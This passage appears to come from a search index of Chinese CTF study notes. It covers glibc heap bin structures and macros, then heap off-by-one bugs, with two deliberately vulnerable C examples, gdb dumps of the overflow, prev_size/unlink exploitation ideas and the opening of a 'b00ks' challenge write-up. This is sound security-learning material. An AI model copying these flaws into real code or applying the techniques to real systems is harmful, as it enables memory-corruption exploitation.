*index\uff0c\u5177\u4f53\u5982\u4e0b \u4e0b\u6807 SIZE_SZ=4\uff0832 \u4f4d\uff09 SIZE_SZ=8\uff0864 \u4f4d\uff09 2 16 32 3 24 48 4 32 64 5 40 80 x 2*4*x 2*8*x 63 504 1008 small bins \u4e2d\u4e00\u5171\u6709 62 \u4e2a \u5faa\u73af\u53cc\u5411\u94fe\u8868\uff0c\u6bcf\u4e2a\u94fe\u8868\u4e2d\u5b58\u50a8\u7684 chunk \u5927\u5c0f\u90fd\u4e00\u81f4* \u3002\u6bd4\u5982\u5bf9\u4e8e 32 \u4f4d\u7cfb\u7edf\u6765\u8bf4\uff0c\u4e0b\u6807 2 \u5bf9\u5e94\u7684\u53cc\u5411\u94fe\u8868\u4e2d\u5b58\u50a8\u7684 chunk \u5927\u5c0f\u4e3a\u5747\u4e3a 16 \u5b57\u8282\u3002\u6bcf\u4e2a\u94fe\u8868\u90fd\u6709\u94fe\u8868\u5934\u7ed3\u70b9\uff0c\u8fd9\u6837\u53ef\u4ee5\u65b9\u4fbf\u5bf9\u4e8e\u94fe\u8868\u5185\u90e8\u7ed3\u70b9\u7684\u7ba1\u7406\u3002\u6b64\u5916\uff0c small bins \u4e2d\u6bcf\u4e2a bin \u5bf9\u5e94\u7684\u94fe\u8868\u91c7\u7528 FIFO \u7684\u89c4\u5219 \uff08\u5148\u8fdb\u5148\u51fa\uff09\uff0c\u6240\u4ee5\u540c\u4e00\u4e2a\u94fe\u8868\u4e2d\u5148\u88ab\u91ca\u653e\u7684 chunk \u4f1a\u5148\u88ab\u5206\u914d\u51fa\u53bb\u3002* \u7269\u7406\u5730\u5740\u76f8\u90bb\u7684 free chunk \u9700\u8981\u8fdb\u884c\u5408\u5e76\u64cd\u4f5c\uff0c\u5373\u5408\u5e76\u6210\u4e00\u4e2a\u5927\u7684 free chunk \u3002 \u5f53\u91ca\u653e small chunk \u7684\u65f6\u5019\uff0c\u5148\u68c0\u67e5\u8be5 chunk \u76f8\u90bb\u7684 chunk \u662f\u5426\u4e3a free chunk \uff0c\u5982\u679c\u662f\u7684\u8bdd\u5c31\u8fdb\u884c\u5408\u5e76\u64cd\u4f5c\uff1a\u5c06\u8fd9\u4e9b chunk \u5408\u5e76\u6210\u65b0\u7684 chunk \uff0c\u7136\u540e\u5c06\u5b83\u4eec\u4ece small bin \u4e2d\u79fb\u9664\uff0c\u6700\u540e\u5c06\u65b0\u7684 chunk \u6dfb\u52a0\u5230 unsorted bin \u4e2d\u3002 small bin \u76f8\u5173\u7684\u5b8f\u5982\u4e0b #define NSMALLBINS 64 #define SMALLBIN_WIDTH MALLOC_ALIGNMENT // \u662f\u5426\u9700\u8981\u5bf9small bin\u7684\u4e0b\u6807\u8fdb\u884c\u7ea0\u6b63 #define SMALLBIN_CORRECTION (MALLOC_ALIGNMENT > 2 * SIZE_SZ) #define MIN_LARGE_SIZE ((NSMALLBINS - SMALLBIN_CORRECTION) * SMALLBIN_WIDTH) //\u5224\u65adchunk\u7684\u5927\u5c0f\u662f\u5426\u5728small bin\u8303\u56f4\u5185 #define in_smallbin_range(sz) \\ ((unsigned long) (sz) < (unsigned long) MIN_LARGE_SIZE) // \u6839\u636echunk\u7684\u5927\u5c0f\u5f97\u5230small bin\u5bf9\u5e94\u7684\u7d22\u5f15\u3002 #define smallbin_index(sz) \\ ((SMALLBIN_WIDTH == 16 ? (((unsigned) (sz)) >> 4) \\ : (((unsigned) (sz)) >> 3)) + \\ SMALLBIN_CORRECTION) \u6216\u8bb8\uff0c\u5927\u5bb6\u4f1a\u5f88\u7591\u60d1\uff0c\u90a3 fastbin \u4e0e small bin \u4e2d chunk \u7684\u5927\u5c0f\u4f1a\u6709\u5f88\u5927\u4e00\u90e8\u5206\u91cd\u5408\u554a\uff0c\u90a3 small bin \u4e2d\u5bf9\u5e94\u5927\u5c0f\u7684 bin \u662f\u4e0d\u662f\u5c31\u6ca1\u6709\u4ec0\u4e48\u4f5c\u7528\u554a\uff1f \u5176\u5b9e\u4e0d\u7136\uff0cfast bin \u4e2d\u7684 chunk \u662f\u6709\u53ef\u80fd\u88ab\u653e\u5230 small bin \u4e2d\u53bb\u7684\uff0c\u6211\u4eec\u5728\u540e\u9762\u5206\u6790\u5177\u4f53\u7684\u6e90\u4ee3\u7801\u65f6\u4f1a\u6709\u6df1\u523b\u7684\u4f53\u4f1a\u3002","title":"Small Bin"},{"location":"glibc-heap/heap_structure/#large-bin","text":"large bins \u4e2d\u4e00\u5171\u5305\u62ec 63 \u4e2a bin\uff0c \u6bcf\u4e2a bin \u4e2d\u7684 chunk \u7684\u5927\u5c0f\u4e0d\u4e00\u81f4\uff0c\u800c\u662f\u5904\u4e8e\u4e00\u5b9a\u533a\u95f4\u8303\u56f4\u5185 \u3002\u6b64\u5916\uff0c\u8fd9 63 \u4e2a bin \u88ab\u5206\u6210\u4e86 6 \u7ec4\uff0c\u6bcf\u7ec4 bin \u4e2d\u7684 chunk \u5927\u5c0f\u4e4b\u95f4\u7684\u516c\u5dee\u4e00\u81f4\uff0c\u5177\u4f53\u5982\u4e0b\uff1a \u7ec4 \u6570\u91cf \u516c\u5dee 1 32 64B 2 16 512B 3 8 4096B 4 4 32768B 5 2 262144B 6 1 \u4e0d\u9650\u5236 \u8fd9\u91cc\u6211\u4eec\u4ee5 32 \u4f4d\u5e73\u53f0\u7684 large bin \u4e3a\u4f8b\uff0c\u7b2c\u4e00\u4e2a large bin \u7684\u8d77\u59cb chunk \u5927\u5c0f\u4e3a 512 \u5b57\u8282\uff0c\u4f4d\u4e8e\u7b2c\u4e00\u7ec4\uff0c\u6240\u4ee5\u8be5 bin \u53ef\u4ee5\u5b58\u50a8\u7684 chunk \u7684\u5927\u5c0f\u8303\u56f4\u4e3a [512,512+64)\u3002 \u5173\u4e8e large bin \u7684\u5b8f\u5982\u4e0b\uff0c\u8fd9\u91cc\u6211\u4eec\u4ee5 32 \u4f4d\u5e73\u53f0\u4e0b\uff0c\u7b2c\u4e00\u4e2a large bin \u7684\u8d77\u59cb chunk \u5927\u5c0f\u4e3a\u4f8b\uff0c\u4e3a 512 \u5b57\u8282\uff0c\u90a3\u4e48 512>>6 = 8\uff0c\u6240\u4ee5\u5176\u4e0b\u6807\u4e3a 56+8=64\u3002 #define largebin_index_32(sz) \\ (((((unsigned long) (sz)) >> 6) <= 38) \\ ? 56 + (((unsigned long) (sz)) >> 6) \\ : ((((unsigned long) (sz)) >> 9) <= 20) \\ ? 91 + (((unsigned long) (sz)) >> 9) \\ : ((((unsigned long) (sz)) >> 12) <= 10) \\ ? 110 + (((unsigned long) (sz)) >> 12) \\ : ((((unsigned long) (sz)) >> 15) <= 4) \\ ? 119 + (((unsigned long) (sz)) >> 15) \\ : ((((unsigned long) (sz)) >> 18) <= 2) \\ ? 124 + (((unsigned long) (sz)) >> 18) \\ : 126) #define largebin_index_32_big(sz) \\ (((((unsigned long) (sz)) >> 6) <= 45) \\ ? 49 + (((unsigned long) (sz)) >> 6) \\ : ((((unsigned long) (sz)) >> 9) <= 20) \\ ? 91 + (((unsigned long) (sz)) >> 9) \\ : ((((unsigned long) (sz)) >> 12) <= 10) \\ ? 110 + (((unsigned long) (sz)) >> 12) \\ : ((((unsigned long) (sz)) >> 15) <= 4) \\ ? 119 + (((unsigned long) (sz)) >> 15) \\ : ((((unsigned long) (sz)) >> 18) <= 2) \\ ? 124 + (((unsigned long) (sz)) >> 18) \\ : 126) // XXX It remains to be seen whether it is good to keep the widths of // XXX the buckets the same or whether it should be scaled by a factor // XXX of two as well. #define largebin_index_64(sz) \\ (((((unsigned long) (sz)) >> 6) <= 48) \\ ? 48 + (((unsigned long) (sz)) >> 6) \\ : ((((unsigned long) (sz)) >> 9) <= 20) \\ ? 91 + (((unsigned long) (sz)) >> 9) \\ : ((((unsigned long) (sz)) >> 12) <= 10) \\ ? 110 + (((unsigned long) (sz)) >> 12) \\ : ((((unsigned long) (sz)) >> 15) <= 4) \\ ? 119 + (((unsigned long) (sz)) >> 15) \\ : ((((unsigned long) (sz)) >> 18) <= 2) \\ ? 124 + (((unsigned long) (sz)) >> 18) \\ : 126) #define largebin_index(sz) \\ (SIZE_SZ == 8 ? largebin_index_64(sz) : MALLOC_ALIGNMENT == 16 \\ ? largebin_index_32_big(sz) \\ : largebin_index_32(sz)) large chunk \u53ef\u4ee5\u6dfb\u52a0\u3001\u5220\u9664\u5728 large bin \u7684\u4efb\u4f55\u4e00\u4e2a\u4f4d\u7f6e\u3002 \u9274\u4e8e\u540c\u4e00\u4e2a large bin \u4e2d\u6bcf\u4e2a chunk \u7684\u5927\u5c0f\u4e0d\u4e00\u5b9a\u76f8\u540c\uff0c\u56e0\u6b64\u4e3a\u4e86\u52a0\u5feb\u5185\u5b58\u5206\u914d\u548c\u91ca\u653e\u7684\u901f\u5ea6\uff0c\u5c31\u5c06\u540c\u4e00\u4e2a large bin \u4e2d\u7684\u6240\u6709 chunk \u6309\u7167 chunk size \u8fdb\u884c\u4ece\u5927\u5230\u5c0f\u7684\u6392\u5217\uff1a\u6700\u5927\u7684 chunk \u653e\u5728\u94fe\u8868\u7684\u524d\u7aef\uff0c\u6700\u5c0f\u7684 chunk \u653e\u5728\u5c3e\u7aef\u3002 large bin \u7684 free \uff08\u5408\u5e76\uff09\u64cd\u4f5c\u7c7b\u4f3c\u4e8e small bin \u3002 large bin malloc \uff08\u90e8\u5206\uff09\u64cd\u4f5c\uff1a \u5982\u679c\u5c3e\u7aef\u6700\u5c0f\u7684 chunk \u5927\u4e8e\u7528\u6237\u8bf7\u6c42\u7684\u5927\u5c0f\u7684\u8bdd\uff0c\u5c31\u5c06\u8be5 chunk \u62c6\u5206\u4e3a\u4e24\u4e2a chunk \uff1a\u524d\u8005\u8fd4\u56de\u7ed9\u7528\u6237\uff0c\u5927\u5c0f\u7b49\u540c\u4e8e\u7528\u6237\u8bf7\u6c42\u7684\u5927\u5c0f\uff1b\u5269\u4f59\u7684\u90e8\u5206\u505a\u4e3a\u4e00\u4e2a\u65b0\u7684 chunk \u6dfb\u52a0\u5230 unsorted bin \u4e2d\u3002","title":"Large Bin"},{"location":"glibc-heap/heap_structure/#unsorted-bin","text":"unsorted bin \u53ef\u4ee5\u89c6\u4e3a\u7a7a\u95f2 chunk \u56de\u5f52\u5176\u6240\u5c5e bin \u4e4b\u524d\u7684\u7f13\u51b2\u533a\u3002 \u5176\u5728 glibc \u4e2d\u5177\u4f53\u7684\u8bf4\u660e\u5982\u4e0b /* Unsorted chunks All remainders from chunk splits, as well as all returned chunks, are first placed in the \"unsorted\" bin. They are then placed in regular bins after malloc gives them ONE chance to be used before binning. So, basically, the unsorted_chunks list acts as a queue, with chunks being placed on it in free (and malloc_consolidate), and taken off (to be either used or placed in bins) in malloc. The NON_MAIN_ARENA flag is never set for unsorted chunks, so it does not have to be taken into account in size comparisons. */ \u4ece\u4e0b\u9762\u7684\u5b8f\u6211\u4eec\u53ef\u4ee5\u770b\u51fa /* The otherwise unindexable 1-bin is used to hold unsorted chunks. */ #define unsorted_chunks(M) (bin_at(M, 1)) unsorted bin \u5904\u4e8e\u6211\u4eec\u4e4b\u524d\u6240\u8bf4\u7684 bin \u6570\u7ec4\u4e0b\u6807 1 \u5904\u3002\u6545\u800c unsorted bin \u53ea\u6709\u4e00\u4e2a\u94fe\u8868\u3002unsorted bin \u4e2d\u7684\u7a7a\u95f2 chunk \u5904\u4e8e\u4e71\u5e8f\u72b6\u6001\uff0c\u4e3b\u8981\u6709\u4e24\u4e2a\u6765\u6e90 \u5f53\u4e00\u4e2a\u8f83\u5927\u7684 chunk \u88ab\u5206\u5272\u6210\u4e24\u534a\u540e\uff0c\u5982\u679c\u5269\u4e0b\u7684\u90e8\u5206\u5927\u4e8e MINSIZE\uff0c\u5c31\u4f1a\u88ab\u653e\u5230 unsorted bin \u4e2d\u3002 \u91ca\u653e\u4e00\u4e2a\u4e0d\u5c5e\u4e8e fast bin \u7684 chunk\uff0c\u5e76\u4e14\u8be5 chunk \u4e0d\u548c top chunk \u7d27\u90bb\u65f6\uff0c\u8be5 chunk \u4f1a\u88ab\u9996\u5148\u653e\u5230 unsorted bin \u4e2d\u3002\u5173\u4e8e top chunk \u7684\u89e3\u91ca\uff0c\u8bf7\u53c2\u8003\u4e0a\u9762\u7684\u4ecb\u7ecd\u3002 \u6b64\u5916\uff0cUnsorted Bin \u5728\u4f7f\u7528\u7684\u8fc7\u7a0b\u4e2d\uff0c\u91c7\u7528\u7684\u904d\u5386\u987a\u5e8f\u662f FIFO \u3002 \u4e0b\u9762\u9644\u4e0a\u5404\u7c7b\u4e0a\u8ff0\u4e09\u7c7b bin \u7684\u903b\u8f91\uff1a","title":"Unsorted Bin"},{"location":"glibc-heap/heap_structure/#common-macro","text":"\u8fd9\u91cc\u4ecb\u7ecd\u4e00\u4e9b\u901a\u7528\u7684\u5b8f \u6839\u636e chunk \u7684\u5927\u5c0f\u7edf\u4e00\u5730\u83b7\u5f97 chunk \u6240\u5728\u7684\u7d22\u5f15 #define bin_index(sz) \\ ((in_smallbin_range(sz)) ? smallbin_index(sz) : largebin_index(sz))","title":"common macro"},{"location":"glibc-heap/heap_structure/#_7","text":"Linux \u5806\u5185\u5b58\u7ba1\u7406\u6df1\u5165\u5206\u6790 CTF-WIKI Linux\u5806\u5185\u5b58\u7ba1\u7406\u6df1\u5165\u5206\u6790(\u4e0a\u534a\u90e8) Linux\u5806\u5185\u5b58\u7ba1\u7406\u6df1\u5165\u5206\u6790(\u4e0b\u534a\u90e8) Linux\u4e0b\u5806\u6808\u7ed3\u6784\u5206\u6790","title":"\u53c2\u8003\u8d44\u6599"},{"location":"glibc-heap/off_by_one/","text":"\u5806\u4e2d\u7684 Off-By-One \u7edd\u5927\u90e8\u5206\u5185\u5bb9\u6765\u81ea CTF-WIKI \uff0c\u5185\u5bb9\u5f15\u7528\u7528\u4e8e\u5b66\u4e60\u8bb0\u5f55 \u4ecb\u7ecd \u4e25\u683c\u6765\u8bf4 off-by-one \u6f0f\u6d1e\u662f\u4e00\u79cd\u7279\u6b8a\u7684\u6ea2\u51fa\u6f0f\u6d1e\uff0coff-by-one \u6307\u7a0b\u5e8f\u5411\u7f13\u51b2\u533a\u4e2d\u5199\u5165\u65f6\uff0c\u5199\u5165\u7684\u5b57\u8282\u6570\u8d85\u8fc7\u4e86\u8fd9\u4e2a\u7f13\u51b2\u533a\u672c\u8eab\u6240\u7533\u8bf7\u7684\u5b57\u8282\u6570\u5e76\u4e14\u53ea\u8d8a\u754c\u4e86\u4e00\u4e2a\u5b57\u8282\u3002 off-by-one \u6f0f\u6d1e\u539f\u7406 off-by-one \u662f\u6307\u5355\u5b57\u8282\u7f13\u51b2\u533a\u6ea2\u51fa\uff0c\u8fd9\u79cd\u6f0f\u6d1e\u7684\u4ea7\u751f\u5f80\u5f80\u4e0e\u8fb9\u754c\u9a8c\u8bc1\u4e0d\u4e25\u548c\u5b57\u7b26\u4e32\u64cd\u4f5c\u6709\u5173\uff0c\u5f53\u7136\u4e5f\u4e0d\u6392\u9664\u5199\u5165\u7684 size \u6b63\u597d\u5c31\u53ea\u591a\u4e86\u4e00\u4e2a\u5b57\u8282\u7684\u60c5\u51b5\u3002\u5176\u4e2d\u8fb9\u754c\u9a8c\u8bc1\u4e0d\u4e25\u901a\u5e38\u5305\u62ec \u4f7f\u7528\u5faa\u73af\u8bed\u53e5\u5411\u5806\u5757\u4e2d\u5199\u5165\u6570\u636e\u65f6\uff0c\u5faa\u73af\u7684\u6b21\u6570\u8bbe\u7f6e\u9519\u8bef\uff08\u8fd9\u5728 C \u8bed\u8a00\u521d\u5b66\u8005\u4e2d\u5f88\u5e38\u89c1\uff09\u5bfc\u81f4\u591a\u5199\u5165\u4e86\u4e00\u4e2a\u5b57\u8282\u3002 \u5b57\u7b26\u4e32\u64cd\u4f5c\u4e0d\u5408\u9002 \u4e00\u822c\u6765\u8bf4\uff0c\u5355\u5b57\u8282\u6ea2\u51fa\u88ab\u8ba4\u4e3a\u662f\u96be\u4ee5\u5229\u7528\u7684\uff0c\u4f46\u662f\u56e0\u4e3a Linux \u7684\u5806\u7ba1\u7406\u673a\u5236 ptmalloc \u9a8c\u8bc1\u7684\u677e\u6563\u6027\uff0c\u57fa\u4e8e Linux \u5806\u7684 off-by-one \u6f0f\u6d1e\u5229\u7528\u8d77\u6765\u5e76\u4e0d\u590d\u6742\uff0c\u5e76\u4e14\u5a01\u529b\u5f3a\u5927\u3002 \u6b64\u5916\uff0c\u9700\u8981\u8bf4\u660e\u7684\u4e00\u70b9\u662f off-by-one \u662f\u53ef\u4ee5\u57fa\u4e8e\u5404\u79cd\u7f13\u51b2\u533a\u7684\uff0c\u6bd4\u5982\u6808[^1]\u3001bss \u6bb5\u7b49\u7b49\uff0c\u4f46\u662f\u5806\u4e0a\uff08heap based\uff09 \u7684 off-by-one \u662f CTF \u4e2d\u6bd4\u8f83\u5e38\u89c1\u7684\u3002\u6211\u4eec\u8fd9\u91cc\u4ec5\u8ba8\u8bba\u5806\u4e0a\u7684 off-by-one \u60c5\u51b5\u3002 [^1]:\u6700\u7b80\u5355\u7684\u662f\u5c31\u662f\u5229\u7528 off-by-one \u6cc4\u9732 Canary \u7684\u503c off-by-one \u5229\u7528\u601d\u8def \u6ea2\u51fa\u5b57\u8282\u4e3a\u53ef\u63a7\u5236\u4efb\u610f\u5b57\u8282 \uff1a\u901a\u8fc7\u4fee\u6539\u5927\u5c0f\u9020\u6210\u5757\u7ed3\u6784\u4e4b\u95f4\u51fa\u73b0\u91cd\u53e0\uff0c\u4ece\u800c\u6cc4\u9732\u5176\u4ed6\u5757\u6570\u636e\uff0c\u6216\u662f\u8986\u76d6\u5176\u4ed6\u5757\u6570\u636e\u3002 \u4e5f\u53ef\u4f7f\u7528 NULL \u5b57\u8282\u6ea2\u51fa\u7684\u65b9\u6cd5 \u6ea2\u51fa\u5b57\u8282\u4e3a NULL \u5b57\u8282 \uff1a\u5728 size \u4e3a 0x100 \u7684\u65f6\u5019\uff0c\u6ea2\u51fa NULL \u5b57\u8282\u53ef\u4ee5\u4f7f\u5f97 prev_in_use \u4f4d\u88ab\u6e05\uff0c\u8fd9\u6837\u524d\u5757\u4f1a\u88ab\u8ba4\u4e3a\u662f free \u5757[^2]\u3002 \u8fd9\u65f6\u53ef\u4ee5\u9009\u62e9\u4f7f\u7528 unlink \u65b9\u6cd5\uff08\u89c1 unlink \u90e8\u5206\uff09\u8fdb\u884c\u5904\u7406\u3002 \u53e6\u5916\uff0c\u8fd9\u65f6 prev_size \u57df\u5c31\u4f1a\u542f\u7528\uff0c\u5c31\u53ef\u4ee5\u4f2a\u9020 prev_size \uff0c\u4ece\u800c\u9020\u6210\u5757\u4e4b\u95f4\u53d1\u751f\u91cd\u53e0\u3002\u6b64\u65b9\u6cd5\u7684\u5173\u952e\u5728\u4e8e unlink \u7684\u65f6\u5019\u6ca1\u6709\u68c0\u67e5\u6309\u7167 prev_size \u627e\u5230\u7684\u5757\u7684\u5927\u5c0f\u4e0e prev_size \u662f\u5426\u4e00\u81f4\uff08libc 2.28 \u4e4b\u524d\uff09\u3002 [^2]:\u4e3e\u4e2a\u5229\u7528\u4e00\u4e2a\u88ab\u5206\u914d\u7684 chunk size \u4e3a 0x101 \uff0c\u8fd9\u662f prev_in_use \u6807\u8bb0\u8fd9\u4e2a chunk \u662f\u88ab\u4f7f\u7528\u72b6\u6001\uff0c\u5982\u679c\u5f53\u6211\u4eec off-by-null \u5c06size \u8986\u76d6\u4e3a 0x100 \uff0c\u90a3\u4e48\u8fd9\u4e2a chunk \u5c31\u88ab\u8ba4\u4e3a\u662f \u7a7a\u95f2\u72b6\u6001 \u6700\u65b0\u7248\u672c\u4ee3\u7801\u4e2d\uff0c\u5df2\u52a0\u5165\u9488\u5bf9 2 \u4e2d\u540e\u4e00\u79cd\u65b9\u6cd5\u7684 check \uff0c\u4f46\u662f\u5728 2.28 \u524d\u5e76\u6ca1\u6709\u8be5 check \u3002 /* consolidate backward */ if (!prev_inuse(p)) { prevsize = prev_size (p); size += prevsize; p = chunk_at_offset(p, -((long) prevsize)); /* \u540e\u4e24\u884c\u4ee3\u7801\u5728\u6700\u65b0\u7248\u672c\u4e2d\u52a0\u5165\uff0c\u5219 2 \u7684\u7b2c\u4e8c\u79cd\u65b9\u6cd5\u65e0\u6cd5\u4f7f\u7528\uff0c\u4f46\u662f 2.28 \u53ca\u4e4b\u524d\u90fd\u6ca1\u6709\u95ee\u9898 */ if (__glibc_unlikely (chunksize(p) != prevsize)) malloc_printerr (\"corrupted size vs. prev_size while consolidating\"); unlink_chunk (av, p); } \u793a\u4f8b 1 int my_gets(char *ptr,int size) { int i; //\u8fd9\u91cc\u5199\u6210\u5c0f\u4e8e\u7b49\u4e8e\u5bfc\u81f4\u53ef\u4ee5\u591a\u5199\u5165\u4e00\u4e2a\u5b57\u8282 for(i=0;i<=size;i++) { ptr[i]=getchar(); } return i; } int main() { void *chunk1,*chunk2; chunk1=malloc(16); chunk2=malloc(16); puts(\"Get Input:\"); my_gets(chunk1,16); return 0; } \u6211\u4eec\u81ea\u5df1\u7f16\u5199\u7684 my_gets \u51fd\u6570\u5bfc\u81f4\u4e86\u4e00\u4e2a off-by-one \u6f0f\u6d1e\uff0c\u539f\u56e0\u662f for \u5faa\u73af\u7684\u8fb9\u754c\u6ca1\u6709\u63a7\u5236\u597d\u5bfc\u81f4\u5199\u5165\u591a\u6267\u884c\u4e86\u4e00\u6b21\uff0c\u8fd9\u4e5f\u88ab\u79f0\u4e3a\u6805\u680f\u9519\u8bef wikipedia: \u6805\u680f\u9519\u8bef\uff08\u6709\u65f6\u4e5f\u79f0\u4e3a\u7535\u7ebf\u6746\u9519\u8bef\u6216\u8005\u706f\u67f1\u9519\u8bef\uff09\u662f\u5dee\u4e00\u9519\u8bef\u7684\u4e00\u79cd\u3002\u5982\u4ee5\u4e0b\u95ee\u9898\uff1a \u5efa\u9020\u4e00\u6761\u76f4\u6805\u680f\uff08\u5373\u4e0d\u56f4\u5708\uff09\uff0c\u957f 30 \u7c73\u3001\u6bcf\u6761\u6805\u680f\u67f1\u95f4\u76f8\u9694 3 \u7c73\uff0c\u9700\u8981\u591a\u5c11\u6761\u6805\u680f\u67f1\uff1f \u6700\u5bb9\u6613\u60f3\u5230\u7684\u7b54\u6848 10 \u662f\u9519\u7684\u3002\u8fd9\u4e2a\u6805\u680f\u6709 10 \u4e2a\u95f4\u9694\uff0c11 \u6761\u6805\u680f\u67f1\u3002 \u6211\u4eec\u4f7f\u7528 gdb \u5bf9\u7a0b\u5e8f\u8fdb\u884c\u8c03\u8bd5\uff0c\u5728\u8fdb\u884c\u8f93\u5165\u524d\u53ef\u4ee5\u770b\u5230\u5206\u914d\u7684\u4e24\u4e2a\u7528\u6237\u533a\u57df\u4e3a 16 \u5b57\u8282\u7684\u5806\u5757 0x602000: 0x0000000000000000 0x0000000000000021 <=== chunk1 0x602010: 0x0000000000000000 0x0000000000000000 0x602020: 0x0000000000000000 0x0000000000000021 <=== chunk2 0x602030: 0x0000000000000000 0x0000000000000000 \u5f53\u6211\u4eec\u6267\u884c my_gets \u8fdb\u884c\u8f93\u5165\u4e4b\u540e\uff0c\u53ef\u4ee5\u770b\u5230\u6570\u636e\u53d1\u751f\u4e86\u6ea2\u51fa\u8986\u76d6\u5230\u4e86\u4e0b\u4e00\u4e2a\u5806\u5757\u7684 prev_size \u57df print 'A'*17 0x602000: 0x0000000000000000 0x0000000000000021 <=== chunk1 0x602010: 0x4141414141414141 0x4141414141414141 0x602020: 0x0000000000000041 0x0000000000000021 <=== chunk2 0x602030: 0x0000000000000000 0x0000000000000000 \u793a\u4f8b 2 \u7b2c\u4e8c\u79cd\u5e38\u89c1\u7684\u5bfc\u81f4 off-by-one \u7684\u573a\u666f\u5c31\u662f\u5b57\u7b26\u4e32\u64cd\u4f5c\u4e86\uff0c\u5e38\u89c1\u7684\u539f\u56e0\u662f\u5b57\u7b26\u4e32\u7684\u7ed3\u675f\u7b26\u8ba1\u7b97\u6709\u8bef int main(void) { char buffer[40]=\"\"; void *chunk1; chunk1=malloc(24); puts(\"Get Input\"); gets(buffer); if(strlen(buffer)==24) { strcpy(chunk1,buffer); } return 0; } \u7a0b\u5e8f\u4e4d\u770b\u4e0a\u53bb\u6ca1\u6709\u4efb\u4f55\u95ee\u9898\uff08\u4e0d\u8003\u8651\u6808\u6ea2\u51fa\uff09\uff0c\u53ef\u80fd\u5f88\u591a\u4eba\u5728\u5b9e\u9645\u7684\u4ee3\u7801\u4e2d\u4e5f\u662f\u8fd9\u6837\u5199\u7684\u3002 \u4f46\u662f strlen \u548c strcpy \u7684\u884c\u4e3a\u4e0d\u4e00\u81f4\u5374\u5bfc\u81f4\u4e86 off-by-one \u7684\u53d1\u751f\u3002 strlen \u662f\u6211\u4eec\u5f88\u719f\u6089\u7684\u8ba1\u7b97 ascii \u5b57\u7b26\u4e32\u957f\u5ea6\u7684\u51fd\u6570\uff0c strlen \u5728\u8ba1\u7b97\u5b57\u7b26\u4e32\u957f\u5ea6\u65f6\u662f\u4e0d\u628a\u7ed3\u675f\u7b26 \\x00 \u8ba1\u7b97\u5728\u5185\u7684\uff0c\u4f46\u662f strcpy \u5728\u590d\u5236\u5b57\u7b26\u4e32\u65f6\u4f1a\u62f7\u8d1d\u7ed3\u675f\u7b26 \\x00 \u3002\u8fd9\u5c31\u5bfc\u81f4\u4e86\u6211\u4eec\u5411 chunk1 \u4e2d\u5199\u5165\u4e86 25 \u4e2a\u5b57\u8282\uff0c\u6211\u4eec\u4f7f\u7528 gdb \u8fdb\u884c\u8c03\u8bd5\u53ef\u4ee5\u770b\u5230\u8fd9\u4e00\u70b9\u3002 0x602000: 0x0000000000000000 0x0000000000000021 <=== chunk1 0x602010: 0x0000000000000000 0x0000000000000000 0x602020: 0x0000000000000000 0x0000000000000411 <=== next chunk \u5728\u6211\u4eec\u8f93\u5165'A'*24 \u540e\u6267\u884c strcpy 0x602000: 0x0000000000000000 0x0000000000000021 0x602010: 0x4141414141414141 0x4141414141414141 0x602020: 0x4141414141414141 0x0000000000000400(11) \u53ef\u4ee5\u770b\u5230 next chunk \u7684 size \u57df\u4f4e\u5b57\u8282\u88ab\u7ed3\u675f\u7b26 '\\x00' \u8986\u76d6\uff0c\u8fd9\u79cd\u53c8\u5c5e\u4e8e off-by-one \u7684\u4e00\u4e2a\u5206\u652f\u79f0\u4e3a NULL byte off-by-one ^3 \uff0c\u6211\u4eec\u5728\u540e\u9762\u4f1a\u770b\u5230 off-by-one \u4e0e NULL byte off-by-one \u5728\u5229\u7528\u4e0a\u7684\u533a\u522b\u3002 \u8fd8\u662f\u6709\u4e00\u70b9\u5c31\u662f\u4e3a\u4ec0\u4e48\u662f\u4f4e\u5b57\u8282\u88ab\u8986\u76d6\u5462\uff0c\u56e0\u4e3a\u6211\u4eec\u901a\u5e38\u4f7f\u7528\u7684 CPU \u7684\u5b57\u8282\u5e8f\u90fd\u662f\u5c0f\u7aef\u6cd5\u7684\uff0c\u6bd4\u5982\u4e00\u4e2a DWORD \u503c\u5728\u4f7f\u7528\u5c0f\u7aef\u6cd5\u7684\u5185\u5b58\u4e2d\u662f\u8fd9\u6837\u50a8\u5b58\u7684 DWORD 0x41424344 \u5185\u5b58 0x44,0x43,0x42,0x41 \u5b9e\u4f8b 1: Asis CTF 2016 b00ks WiKi\u4e0a\u6ca1\u6709\u660e\u786e\u8bf4\u660e\u9898\u76ee\u7684\u73af\u5883\uff0c\u591a\u65b9\u786e\u8ba4\u540e\uff1a\u5982\u679c\u4f7f\u7528\u4fee\u6539\u7ed3\u6784\u4f53\u6307\u9488\u5b9e\u73b0\u4efb\u610f\u5730\u5740\u5199\uff0c\u73af\u5883\u5e94\u8be5\u662f ubuntu 18 ;\u5982\u679c\u4f7f\u7528 unlink \u4e5f\u5c31\u662f wiki \u4e2d\u7684\u7b80\u6d01\u65b9\u6848\uff0cubuntu16&18\u3002 \u4ee5\u4e0b wp \u5173\u4e8e\u4fee\u6539\u7ed3\u6784\u4f53\u6307\u9488\u65b9\u6cd5\u90fd\u66ff\u6362\u4e3a\u6211\u81ea\u5df1\u7684\u7248\u672c \u4fdd\u62a4\u60c5\u51b5 \u9898\u76ee\u662f 64 \u4f4d\u7a0b\u5e8f\uff0c\u4fdd\u62a4\u5982\u4e0b\u6240\u793a\u3002 Arch: amd64-64-little RELRO: Full RELRO Stack: No canary found NX: NX enabled PIE: PIE enabled \u7a0b\u5e8f\u529f\u80fd \u9898\u76ee\u662f\u4e00\u4e2a\u5e38\u89c1\u7684\u9009\u5355\u5f0f\u7a0b\u5e8f\uff0c\u529f\u80fd\u662f\u4e00\u4e2a\u56fe\u4e66\u7ba1\u7406\u7cfb\u7edf\u3002\u7a0b\u5e8f\u63d0\u4f9b\u4e86\u521b\u5efa\u3001\u5220\u9664\u3001\u7f16\u8f91\u3001\u6253\u5370\u56fe\u4e66\u7684\u529f\u80fd\u3002 1. Create a book 2. Delete a book 3. Edit a book 4. Print book detail 5. Change current author name 6. Exit \u8fdb\u5165\u7a0b\u5e8f\u8981\u6c42\u8f93\u5165\u4e00\u4e2a author name \u957f\u5ea6\u8981\u6c42\u4e0d\u5927\u4e8e32\u3002 \u6bcf\u672c\u4e66\uff08chunk\uff09\u4fe1\u606f\u7528\u5927\u5c0f\u4e3a 0x20 \u7684 book \u7ed3\u6784\u4f53\u6765\u7ef4\u62a4\uff0c\u5176\u4e2d name \u548c description \u5728\u5806\u4e0a\u5206\u914d\uff0c\u7ed3\u6784\u4f53\u4e2d\u5b58\u50a8\u7684\u662f\u5730\u5740\u6307\u9488\u3002book_name\u3001book_description 